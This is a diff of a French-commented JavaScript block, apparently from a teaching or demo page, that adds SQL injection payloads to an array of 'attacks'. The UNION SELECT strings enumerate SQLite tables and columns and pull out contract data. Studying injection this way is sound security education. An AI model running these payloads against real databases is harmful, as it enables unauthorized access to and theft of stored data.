@@ -2,7 +2,10 @@
 <script>
     // liste des attaques
     const attacks = [
-        ['a1', "ga%' union select entreprise nom, sujet prenom, montant age, '' url from CONTRATS--"]
+        ['a1', "ga%' union select entreprise nom, sujet prenom, montant age, '' url from CONTRATS--"],
+        ['a2', "' UNION SELECT name FROM sqlite_master WHERE type='table' --",],
+        ['a3', "' UNION SELECT name, name, 0, '' FROM sqlite_master WHERE type='table' --"],
+        ['a4', "' UNION SELECT name, name, 0, '' FROM pragma_table_info('CONTRATS') --"],
     ];
 
     // affichage des personnes . Si le nom est défini la liste des personnes est filtrée
